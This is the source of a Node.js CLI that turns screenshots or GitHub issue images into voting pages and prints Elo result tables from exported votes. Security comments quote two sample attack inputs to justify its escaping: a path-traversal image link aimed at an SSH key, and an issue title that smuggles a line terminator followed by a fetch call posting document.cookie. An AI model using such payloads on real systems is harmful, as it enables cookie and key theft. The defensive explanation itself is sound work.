#!/usr/bin/env node
// Make a dome and read its results without opening a browser.
//
//   node cli.mjs new density --title "How dense?" --media a.png --media b.png
//   node cli.mjs new density --spec spec.json          # or --spec - to read stdin
//   node cli.mjs new density --from-pr manaflow-ai/cmux#1234
//   node cli.mjs results density --votes votes.json
//   node cli.mjs results density --votes votes.json --md
//   node cli.mjs build density
//
// `new` writes examples/<name>/config.js and builds it, so one command takes you from
// "here are four screenshots" to a page you can send someone. The generated config is
// ordinary source with nothing generated-looking about it: edit it and rebuild.
//
// `results` recomputes the table from a votes export. The browser is where votes are
// cast and the shared table lives in a claude.ai artifact, so there is no live feed to
// read from here; export the collection to JSON and hand it over.

import { readFileSync, writeFileSync, copyFileSync, existsSync, statSync, mkdirSync, readdirSync } from "node:fs";
import { dirname, join, resolve, basename, extname, relative, sep } from "node:path";
import { fileURLToPath } from "node:url";
import { execFileSync } from "node:child_process";
import { createRequire } from "node:module";
import { build, readConfig, short } from "./build.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const T = createRequire(import.meta.url)("./engine/thunderdome.js");

// ---------- pure helpers (no fs, no network; exercised by test.mjs) ----------

// Flags are `--name value`, `--name=value` or bare `--name`, and a repeated flag
// collects into a list. Everything before the first flag is positional, which is what
// makes `new density --title x` read the way it looks.
export function parseArgs(argv) {
  // Null prototype, and hasOwn rather than `in`. With a plain object, `--toString x`
  // finds Object.prototype's method on the "already seen this flag" test and collects
  // into [ƒ, "x"]. Nothing shipped collides today, which is the kind of thing that
  // stops being true the week someone adds a flag called --constructor.
  const out = { __proto__: null, _: [] };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (!a.startsWith("--")) { out._.push(a); continue; }
    const eq = a.indexOf("=");
    const key = eq > 0 ? a.slice(2, eq) : a.slice(2);
    let val = eq > 0 ? a.slice(eq + 1) : null;
    if (val == null) val = argv[i + 1] != null && !argv[i + 1].startsWith("--") ? argv[++i] : true;
    if (Object.hasOwn(out, key)) out[key] = (Array.isArray(out[key]) ? out[key] : [out[key]]).concat(val);
    else out[key] = val;
  }
  return out;
}

// A flag that needs a value and did not get one. `--out` at the end of a line parses as
// the boolean true, and String(true) is a perfectly good directory name, so without this
// a slipped argument silently creates a folder called `true` in your cwd.
function str(v, flag) {
  if (typeof v === "string") return v;
  if (Array.isArray(v)) return str(v[v.length - 1], flag);
  throw new Error(`--${flag} needs a value`);
}

const list = v => (v == null || v === true ? [] : Array.isArray(v) ? v : [v]);
const slug = s => String(s).toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "") || "x";

// "shots/dense-rows@2x.png" -> {id: "dense-rows", name: "Dense rows"}. Names taken off
// filenames because that is what the person naming the files already meant them to say.
export function contenderFromPath(src, i) {
  const stem = basename(String(src), extname(String(src))).replace(/@\dx$/, "");
  const id = slug(stem) || `c${i + 1}`;
  const name = stem.replace(/[-_]+/g, " ").replace(/^\w/, c => c.toUpperCase());
  return { id, name, media: src };
}

// Contender ids have to be unique or normalize() throws, and two files called
// shot.png in different folders is the ordinary way to arrive at a collision.
export function uniqueIds(contenders) {
  const seen = new Set();
  return contenders.map(c => {
    let id = c.id, n = 2;
    while (seen.has(id)) id = `${c.id}-${n++}`;
    seen.add(id);
    return id === c.id ? c : { ...c, id };
  });
}

// A spec is the config without the ceremony: what an agent would type. Everything is
// optional except enough contenders to hold a duel.
export function specFromArgs(name, args) {
  const media = list(args.media).filter(s => typeof s === "string");
  const spec = {
    id: slug(args.id ? str(args.id, "id") : name),
    title: typeof args.title === "string" ? args.title : titleCase(name),
    lede: typeof args.lede === "string" ? args.lede : "",
  };
  if (typeof args["asked-by"] === "string") spec.askedBy = args["asked-by"];
  if (args.aspect != null) spec.media = { aspect: str(args.aspect, "aspect") };
  if (media.length) spec.contenders = uniqueIds(media.map(contenderFromPath));
  return spec;
}

function titleCase(s) {
  return String(s).replace(/[-_]+/g, " ").replace(/^\w/, c => c.toUpperCase());
}

// Every image, GIF and clip in an issue or PR body, in the order they appear. Covers
// markdown images, plain links to a media file, and GitHub's own attachment host, which
// serves screenshots pasted into a comment from a URL with no extension on it.
const MEDIA_URL = /\.(png|jpe?g|gif|webp|avif|svg|mp4|webm|mov|m4v|ogv)(?:[?#]|$)/i;
const GH_ASSET = /^https:\/\/(?:user-images\.githubusercontent\.com|github\.com\/user-attachments\/assets)\//i;
export function mediaFromMarkdown(body) {
  const out = [];
  const push = (url, alt) => {
    // http(s) only, and absolute. This body came off the network, so a relative path in
    // it is a stranger naming a file on your disk: `![two](../../.ssh/id_rsa.png)` would
    // otherwise be resolved against your cwd and copied into a page you then publish.
    // It also drops `javascript:` and friends, which until now died further along as
    // "no such media file", which is protection by accident.
    if (!/^https?:\/\//i.test(url)) return;
    if (!MEDIA_URL.test(url) && !GH_ASSET.test(url)) return;
    if (out.some(x => x.src === url)) return;
    out.push({ src: url, alt: alt || "" });
  };
  // Fenced blocks are documentation, not the question. A PR body that shows what a
  // config looks like should not put the config's own screenshots in the arena.
  const text = String(body || "").replace(/^```[\s\S]*?^```/gm, "").replace(/`[^`\n]*`/g, "");
  // Three passes, not one, and the order is deliberate rather than positional: markdown
  // images first so a picture with alt text gets named after it, `<img>` next, bare URLs
  // last. The dedupe keeps the first sighting, so alt text always wins over a filename.
  // Alt text may contain balanced brackets: `![panel [2]](...)` is one people write.
  for (const m of text.matchAll(/!\[((?:[^\][]|\[[^\][]*\])*)\]\(\s*<?([^\s)>]+)>?[^)]*\)/g)) push(m[2], m[1]);
  for (const m of text.matchAll(/<img\b[^>]*\bsrc=["']([^"']+)["'][^>]*>/gi)) push(m[1], "");
  // Includes the target of a plain `[label](url)` link, which is why there is no
  // lookbehind here: the dedupe above already stops an image being picked up twice.
  // Trailing sentence punctuation is not part of the URL: "see https://x/a.png." ends
  // in a full stop that would otherwise defeat the extension test.
  for (const m of text.matchAll(/\bhttps?:\/\/[^\s<>"'`)\]]+/g)) push(m[0].replace(/[.,;:!?]+$/, ""), "");
  return out;
}

// An issue or PR becomes a dome: its title is the question, its images are the
// contenders. The point is that "which of these four?" posted in an issue turns into a
// page you can vote on without anyone retyping the alternatives.
export function specFromIssue(ref, issue) {
  const shots = mediaFromMarkdown(issue.body);
  const contenders = uniqueIds(shots.map((s, i) => {
    const fromAlt = s.alt && slug(s.alt);
    const base = fromAlt && fromAlt !== "x" ? { id: fromAlt, name: s.alt } : contenderFromPath(s.src, i);
    return { ...base, media: s.src };
  }));
  return {
    id: slug(`${ref.repo}-${ref.number}`),
    title: issue.title || `${ref.owner}/${ref.repo}#${ref.number}`,
    lede: `From <a href="${issue.html_url}">${ref.owner}/${ref.repo}#${ref.number}</a>. Vote, then take the table back there.`,
    askedBy: `${ref.owner}/${ref.repo}#${ref.number}`,
    contenders,
  };
}

// owner/repo#123, or any of the URLs GitHub's own Copy link buttons hand you. The
// trailing junk matters more than it looks: the link you get from a comment ends in
// #issuecomment-123, and the one from a PR's Files tab ends in /files, and both are
// what a person actually has on their clipboard when they run this.
export function parseRef(s) {
  const bare = String(s).trim().replace(/^https?:\/\/(?:www\.)?github\.com\//i, "");
  // Anchored at the front only. Whatever follows the number is GitHub's trailing junk
  // (/files, ?w=1, #issuecomment-123, a bare /) and none of it is part of the reference.
  // The lookahead is what keeps that from also accepting `o/r/issues/9nonsense`.
  const m = /^([\w.-]+)\/([\w.-]+)(?:#|\/(?:pull|issues)\/)(\d+)(?![\w-])/.exec(bare);
  if (!m) throw new Error(`not an issue or PR reference: ${s} (want owner/repo#123)`);
  return { owner: m[1], repo: m[2], number: +m[3] };
}

// Source text, not JSON with a wrapper. Someone is going to open this file and change a
// name, and a config that reads like the handwritten ones is a config they can edit.
export function renderConfig(spec) {
  // Everything here can have come off a stranger's issue title or a filename, and the
  // output is a script tag in a page somebody publishes. Two escapes, both load-bearing:
  //
  // `j` is JSON.stringify plus the two line terminators it does not escape. U+2028 and
  // U+2029 are LineTerminators to a JS parser but ordinary characters to JSON, so a
  // string containing one closes the literal and the rest of the line is code.
  const j = v => JSON.stringify(v).replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029");
  // `cmt` is for the header comments, which are the only place a value is written
  // without quotes. Anything a JS parser treats as the end of a line ends the comment,
  // and then an issue titled "Which?<U+2028>fetch('https://...', {body: document.cookie})"
  // is a script that runs when the page opens.
  const cmt = v => String(v).replace(/[\r\n\u2028\u2029\u0085]+/g, " ").trim();
  const contender = c => {
    const bits = [`id: ${j(c.id)}`, `name: ${j(c.name)}`];
    if (c.note) bits.push(`note: ${j(c.note)}`);
    if (c.media) bits.push(`media: ${j(c.media)}`);
    if (c.html) bits.push(`html: ${j(c.html)}`);
    return `    { ${bits.join(", ")} },`;
  };
  const question = q => [
    `    {`,
    `      id: ${j(q.id)},`,
    q.short ? `      short: ${j(q.short)},` : null,
    q.title ? `      title: ${j(q.title)},` : null,
    q.lede ? `      lede: ${j(q.lede)},` : null,
    `      contenders: [`,
    ...q.contenders.map(c => "  " + contender(c)),
    `      ],`,
    `    },`,
  ].filter(x => x != null).join("\n");

  const head = [
    `// ${cmt(spec.title || spec.id)}`,
    spec.askedBy ? `// Asked by ${cmt(spec.askedBy)}.` : null,
    `// Built by \`node cli.mjs new\`. This is ordinary config source: edit it and rebuild.`,
    ``,
    `Thunderdome.start({`,
    `  id: ${j(spec.id)},`,
    spec.title ? `  title: ${j(spec.title)},` : null,
    spec.lede ? `  lede: ${j(spec.lede)},` : null,
    spec.askedBy ? `  askedBy: ${j(spec.askedBy)},` : null,
    spec.collection ? `  collection: ${j(spec.collection)},` : null,
    spec.media ? `  media: ${j(spec.media)},` : null,
  ].filter(x => x != null);

  const body = spec.questions
    ? [`  questions: [`, ...spec.questions.map(question), `  ],`]
    : [`  contenders: [`, ...(spec.contenders || []).map(contender), `  ],`];

  return [...head, ...body, `});`, ``].join("\n");
}

// ---------- results ----------

const first = (Q, D) => Q === D.questions[0];
export function votesFor(D, Q, votes) {
  return D.multi
    ? votes.filter(v => v.q === Q.id || (v.q == null && first(Q, D)))
    : votes.slice();
}

// One question's table, as data. The CLI and whatever posts it to GitHub both read
// this, so the text and the markdown cannot drift apart.
export function tableFor(D, Q, votes) {
  const ids = Q.contenders.map(c => c.id);
  const byId = Object.fromEntries(Q.contenders.map(c => [c.id, c]));
  const mine = votesFor(D, Q, votes).slice().sort((a, b) => a.t - b.t);
  // The engine's own options, not defaults of our own: `confidence: false` has to stay
  // off here, and the resample count has to be the one the browser picked for this many
  // votes, or the same dome prints ±18 on the page and ±20 in a terminal.
  const conf = T.confidence(ids, mine, T.confidenceOpts(D, mine.length));
  const rec = T.records(ids, mine);
  const order = ids.slice().sort((x, y) => conf.rating[y] - conf.rating[x]);
  const name = id => (byId[id] ? byId[id].name : id);
  const rows = order.map((id, i) => ({
    rank: i + 1,
    id,
    name: name(id),
    rating: Math.round(conf.rating[id]),
    spread: conf.lo ? Math.round((conf.hi[id] - conf.lo[id]) / 2) : null,
    // En dashes, as the browser table writes them, so a record pasted from here and
    // a record read off the page are the same string.
    record: `${rec[id].w}–${rec[id].l}–${rec[id].t}`,
  }));
  // The same sentence the page puts under its table, from the same function. Written
  // out here once, it drifted: the bar was hardcoded at 95 instead of derived from the
  // dome's own level, and it compared the rounded percentage, so a share of .9457 was
  // called a lead by a table that also printed it as 95%.
  const verdict = T.verdictFor(conf, order, name);
  return { question: Q.id, title: Q.title || Q.label || "", bouts: conf.bouts, rows, verdict };
}

export function tablesFor(cfg, votes) {
  const D = T.normalizeDome(cfg);
  return D.questions.map(Q => tableFor(D, Q, votes));
}

const pad = (s, w, right) => (right ? String(s).padStart(w) : String(s).padEnd(w));

export function renderText(tables, cfg) {
  const out = [];
  if (cfg && cfg.title) out.push(cfg.title, "");
  for (const t of tables) {
    if (t.title) out.push(t.title);
    const cells = t.rows.map(r => [String(r.rank), r.name, r.spread == null ? String(r.rating) : `${r.rating} ±${r.spread}`, r.record]);
    const head = ["#", "", "Elo", "W–L–T"];
    const w = head.map((h, i) => Math.max(h.length, ...cells.map(c => c[i].length)));
    out.push(`  ${pad(head[0], w[0])}  ${pad(head[1], w[1])}  ${pad(head[2], w[2], true)}  ${pad(head[3], w[3], true)}`);
    for (const c of cells) {
      out.push(`  ${pad(c[0], w[0])}  ${pad(c[1], w[1])}  ${pad(c[2], w[2], true)}  ${pad(c[3], w[3], true)}`);
    }
    out.push(`  ${t.verdict}`, "");
  }
  return out.join("\n");
}

// Markdown, for pasting back into the issue that asked. GFM tables, no HTML, so it
// renders the same in an issue, a PR body and a comment.
export function renderMarkdown(tables, cfg) {
  const out = [];
  // A contender's name can be alt text a stranger typed into an issue, and this table
  // is going straight back into that issue. An unescaped pipe is a row with an extra
  // cell in a four-column table, which is a wrecked table at best and a forged one at
  // worst; a newline ends the row early and turns the rest into prose.
  const cell = s => String(s).replace(/\|/g, "\\|").replace(/\s*[\r\n]+\s*/g, " ");
  if (cfg && cfg.title) out.push(`## ${cfg.title}`, "");
  for (const t of tables) {
    if (t.title) out.push(`### ${t.title}`, "");
    out.push("| # | | Elo | W–L–T |", "|---:|---|---:|---:|");
    for (const r of t.rows) {
      const elo = r.spread == null ? String(r.rating) : `${r.rating} ±${r.spread}`;
      out.push(`| ${r.rank} | ${cell(r.name)} | ${elo} | ${r.record} |`);
    }
    out.push("", t.verdict, "");
  }
  if (cfg && cfg.askedBy) out.push(`Asked by ${cfg.askedBy}.`);
  return out.join("\n").replace(/\n{3,}/g, "\n\n").trim() + "\n";
}

// ---------- commands ----------

function gh(args) {
  try {
    // stderr captured rather than inherited: otherwise gh prints its own "Not Found"
    // and then we print the same line back inside ours, which reads like two failures.
    return execFileSync("gh", args, { encoding: "utf8", maxBuffer: 32 * 1024 * 1024, stdio: ["ignore", "pipe", "pipe"] });
  } catch (e) {
    const msg = (e.stderr || e.message || "").toString().trim().split("\n")[0];
    // Only suggest the fix that matches the failure. "Is gh installed and logged in?"
    // under a 404 sends people to re-authenticate over a typo in the issue number.
    const hint = e.code === "ENOENT"
      ? ". Install the GitHub CLI, or pass --spec instead"
      : /\b401\b|auth|login|credential/i.test(msg) ? ". Try `gh auth login`" : "";
    throw new Error(`gh failed: ${msg || e.message}${hint}`);
  }
}

function readSpec(where) {
  const raw = where === "-" ? readFileSync(0, "utf8") : readFileSync(resolve(where), "utf8");
  const spec = JSON.parse(raw);
  if (!spec || typeof spec !== "object" || Array.isArray(spec)) throw new Error("spec must be a JSON object");
  // Checked here rather than left to hit `.map` further down, where it surfaces as
  // "spec.questions.map is not a function", which is a stack trace wearing a message.
  if (spec.questions != null && !Array.isArray(spec.questions)) throw new Error("spec.questions must be a list");
  return spec;
}

// Screenshots live wherever you took them, and the ones in an issue live on somebody
// else's server. The build inlines media that sits inside the dome folder and leaves
// everything else as written, so a page built from /tmp/shot.png comes out with four
// broken cards, and a page built from a GitHub attachment URL comes out looking fine
// here and empty for everyone you send it to, because those URLs are auth-gated on a
// private repo. Both cases end the same way: gather the files into the dome and point
// the spec at the copies, so one command really does give you a page you can send.
//
// Planning is pure. Nothing is written, fetched or created until the whole plan is
// known to be good, so a typo in one --media leaves no folder and no half-downloaded
// picture behind. A local path that is not a file is a typo, and a typo that builds is
// worse than one that fails: you find out when someone else opens the page.
const MEDIA_EXT = /\.(png|jpe?g|gif|webp|avif|svg|mp4|webm|mov|m4v|ogv)$/i;
export function planMedia(spec, dir, opts = {}, fs = FS) {
  const taken = new Set(), missing = [], copies = [], fetches = [];
  const root = resolve(dir), mediaDir = join(root, "media");
  // Everything already sitting in <dome>/media/ owns its name before we plan anything.
  // Without this, a second run brings in another shot.png, overwrites the first, and
  // leaves two contenders pointing at one picture: a duel between an image and itself,
  // which the engine will happily build and serve.
  for (const b of fs.list(mediaDir)) taken.add(b);
  const reserve = name => {
    const stem = name.replace(MEDIA_EXT, ""), ext = (MEDIA_EXT.exec(name) || [""])[0];
    let out = name, i = 2;
    while (taken.has(out)) out = `${stem}-${i++}${ext}`;
    taken.add(out);
    return out;
  };
  const bring = c => {
    if (typeof c.media !== "string" || /^data:/i.test(c.media)) return c;
    if (/^https?:/i.test(c.media)) {
      if (opts.link) return c;                              // --link-media: leave it remote
      let base;
      try { base = basename(new URL(c.media).pathname); } catch (e) { return c; }
      // GitHub's attachment host serves pasted screenshots from a URL with no extension
      // on it, so the name is a uuid and the type only shows up in the response. Those
      // get named after the contender and typed from the content-type at fetch time.
      const name = reserve(MEDIA_EXT.test(base) ? base : `${c.id}`);
      fetches.push({ url: c.media, dest: join(mediaDir, name), name });
      return { ...c, media: `media/${name}` };
    }
    const src = resolve(process.cwd(), c.media);
    if (src === root || src.startsWith(root + sep)) {       // already where the build can see it
      if (!fs.isFile(src)) missing.push(c.media);
      return c;
    }
    if (!fs.isFile(src)) {
      // A path written relative to the dome folder rather than to cwd is the same file
      // by another name, and the build will find it. Only complain if neither exists.
      if (!fs.isFile(join(root, c.media))) missing.push(c.media);
      return c;
    }
    const name = reserve(basename(src));
    copies.push([src, join(mediaDir, name)]);
    return { ...c, media: `media/${name}` };
  };
  const planned = spec.questions
    ? { ...spec, questions: spec.questions.map(q => ({ ...q, contenders: (q.contenders || []).map(bring) })) }
    : { ...spec, contenders: (spec.contenders || []).map(bring) };
  if (missing.length) {
    throw new Error(`no such media file${missing.length === 1 ? "" : "s"}: ${missing.join(", ")}`);
  }
  return { spec: planned, copies, fetches };
}

const CT_EXT = {
  "image/png": ".png", "image/jpeg": ".jpg", "image/gif": ".gif", "image/webp": ".webp",
  "image/avif": ".avif", "image/svg+xml": ".svg", "video/mp4": ".mp4", "video/webm": ".webm",
  "video/quicktime": ".mov", "video/ogg": ".ogv",
};

// Copies first, because they cannot fail once planned. A download that does fail is not
// fatal: the src stays the URL it already was, which is exactly the page you would have
// got before, and the caller says so out loud rather than leaving you to discover it.
export async function applyMedia(plan, fs = FS) {
  for (const [src, dest] of plan.copies) fs.copyIn(src, dest);
  const failed = [];
  for (const f of plan.fetches) {
    try {
      const { body, type } = await fs.get(f.url);
      let name = f.name;
      if (!MEDIA_EXT.test(name)) name += CT_EXT[String(type).split(";")[0].trim().toLowerCase()] || ".png";
      fs.write(join(dirname(f.dest), name), body);
      f.saved = `media/${name}`;
    } catch (e) {
      failed.push({ url: f.url, why: (e && e.message) || String(e) });
      f.saved = null;
    }
  }
  // Point the spec back at whatever actually landed.
  const fix = c => {
    const f = plan.fetches.find(x => `media/${x.name}` === c.media);
    if (!f) return c;
    return f.saved ? { ...c, media: f.saved } : { ...c, media: f.url };
  };
  const s = plan.spec;
  const out = s.questions
    ? { ...s, questions: s.questions.map(q => ({ ...q, contenders: (q.contenders || []).map(fix) })) }
    : { ...s, contenders: (s.contenders || []).map(fix) };
  return { spec: out, copied: plan.copies.length, fetched: plan.fetches.length - failed.length, failed };
}

const FS = {
  isFile: p => existsSync(p) && statSync(p).isFile(),
  list: p => { try { return readdirSync(p); } catch (e) { return []; } },
  copyIn: (src, dest) => { mkdirSync(dirname(dest), { recursive: true }); copyFileSync(src, dest); },
  write: (dest, buf) => { mkdirSync(dirname(dest), { recursive: true }); writeFileSync(dest, buf); },
  get: async url => {
    const r = await fetch(url, { redirect: "follow" });
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    return { body: Buffer.from(await r.arrayBuffer()), type: r.headers.get("content-type") || "" };
  },
};

async function cmdNew(args) {
  const name = args._[1];
  if (!name) throw new Error("usage: cli.mjs new <name> [--title ...] [--media a.png --media b.png] [--spec file|-] [--from-pr owner/repo#123]");
  let spec;
  if (args["from-pr"] || args["from-issue"] || args.from) {
    const from = args["from-pr"] || args["from-issue"] || args.from;
    const ref = parseRef(str(from, args["from-pr"] ? "from-pr" : args["from-issue"] ? "from-issue" : "from"));
    const issue = JSON.parse(gh(["api", `repos/${ref.owner}/${ref.repo}/issues/${ref.number}`]));
    spec = specFromIssue(ref, issue);
    spec.id = slug(args.id ? str(args.id, "id") : name);
    if (typeof args.title === "string") spec.title = args.title;
  } else if (args.spec) {
    spec = { ...readSpec(args.spec === true ? "-" : str(args.spec, "spec")) };
    if (!spec.id) spec.id = slug(name);
  } else {
    spec = specFromArgs(name, args);
  }
  const count = spec.questions
    ? Math.min(...spec.questions.map(q => (q.contenders || []).length))
    : (spec.contenders || []).length;
  if (!(count >= 2)) {
    throw new Error(`a dome needs at least two contenders per question, found ${count}. ` +
      (args["from-pr"] ? "That issue has fewer than two images in its body." : "Pass --media twice, or a --spec."));
  }
  // Fail before writing rather than after: the engine's own validation is the only
  // definition of a valid config, and a config that only fails in the browser is a file
  // someone has to go delete.
  T.normalizeDome(JSON.parse(JSON.stringify(spec)));

  const dir = args.out ? resolve(str(args.out, "out")) : join(here, "examples", slug(name));
  const configPath = join(dir, "config.js");
  if (existsSync(configPath) && !args.force) {
    throw new Error(`${short(configPath)} already exists; pass --force to overwrite`);
  }
  // Plan before mkdir, so a bad --media does not leave an empty dome behind.
  const plan = planMedia(spec, dir, { link: !!args["link-media"] });
  mkdirSync(dir, { recursive: true });
  const got = await applyMedia(plan);
  const bits = [`${count} contenders`];
  if (got.copied) bits.push(`${got.copied} media file${got.copied === 1 ? "" : "s"} copied in`);
  if (got.fetched) bits.push(`${got.fetched} downloaded`);
  writeFileSync(configPath, renderConfig(got.spec));
  console.log(`wrote ${short(configPath)} (${bits.join(", ")})`);
  // Loudly, because the whole promise of the output is that it is one file you can send
  // someone, and a card backed by a URL that only loads for you breaks it quietly.
  for (const f of got.failed) console.warn(`  couldn't download ${f.url} (${f.why}); left as a remote URL`);
  if (got.failed.length) console.warn(`  ${got.failed.length} card${got.failed.length === 1 ? "" : "s"} will need network, and won't load at all if the source is private`);
  if (!args["no-build"]) build(dir);
  return dir;
}

function domeDir(nameOrDir) {
  const direct = resolve(nameOrDir);
  if (existsSync(join(direct, "config.js"))) return direct;
  const inExamples = join(here, "examples", nameOrDir);
  if (existsSync(join(inExamples, "config.js"))) return inExamples;
  const have = existsSync(join(here, "examples"))
    ? readdirSync(join(here, "examples")).filter(d => existsSync(join(here, "examples", d, "config.js")))
    : [];
  throw new Error(`no config.js for "${nameOrDir}". Domes here: ${have.join(", ") || "none"}`);
}

function cmdResults(args) {
  const which = args._[1];
  if (!which) throw new Error("usage: cli.mjs results <name|dir> --votes votes.json [--md|--json]");
  const dir = domeDir(which);
  const cfg = readConfig(readFileSync(join(dir, "config.js"), "utf8"), join(dir, "config.js"));
  if (!cfg.id) throw new Error(`${short(dir)}/config.js did not call Thunderdome.start()`);
  let votes = [];
  if (args.votes) {
    const raw = args.votes === "-" || args.votes === true ? readFileSync(0, "utf8") : readFileSync(resolve(str(args.votes, "votes")), "utf8");
    const parsed = JSON.parse(raw);
    // A claude.ai collection export is usually {documents: [...]} or a bare list, and
    // both turn up in practice depending on which tool did the exporting.
    votes = Array.isArray(parsed) ? parsed : Array.isArray(parsed.documents) ? parsed.documents : Array.isArray(parsed.votes) ? parsed.votes : null;
    if (!votes) throw new Error("--votes must be a JSON list, or an object with a documents or votes list");
  } else {
    console.error("No --votes given, so this is the empty table. Export the collection and pass it in.");
  }
  const tables = tablesFor(cfg, votes);
  if (args.json) console.log(JSON.stringify({ id: cfg.id, title: cfg.title || null, askedBy: cfg.askedBy || null, tables }, null, 2));
  else if (args.md || args.markdown) process.stdout.write(renderMarkdown(tables, cfg));
  else console.log(renderText(tables, cfg));
}

const USAGE = `thunderdome

  node cli.mjs new <name> --title "..." --media a.png --media b.png
  node cli.mjs new <name> --spec spec.json        (--spec - reads stdin)
  node cli.mjs new <name> --from-pr owner/repo#123
  node cli.mjs results <name> --votes votes.json [--md | --json]
  node cli.mjs build <name>

new       writes examples/<name>/config.js and builds index.html
          --out <dir>    somewhere other than examples/<name>
          --id <id>      dome id, if it should differ from <name>
          --aspect 16/9  media box shape
          --link-media   leave remote images as URLs instead of downloading them
          --force        overwrite an existing config.js
          --no-build     write the config and stop
          --from-issue and --from are accepted as aliases of --from-pr
results   recomputes the table from an exported votes list
          --votes -      reads the votes list from stdin
build     rebuilds an existing dome
`;

async function main(argv) {
  const args = parseArgs(argv);
  const cmd = args._[0];
  if (!cmd || args.help || cmd === "help") { process.stdout.write(USAGE); return; }
  if (cmd === "new") return void await cmdNew(args);
  if (cmd === "results") return void cmdResults(args);
  if (cmd === "build") return void build(domeDir(args._[1] || "."));
  throw new Error(`unknown command "${cmd}". Try: new, results, build`);
}

if (process.argv[1] && resolve(process.argv[1]) === resolve(fileURLToPath(import.meta.url))) {
  main(process.argv.slice(2))
    .catch(e => { console.error(`thunderdome: ${e.message}`); process.exit(1); });
}
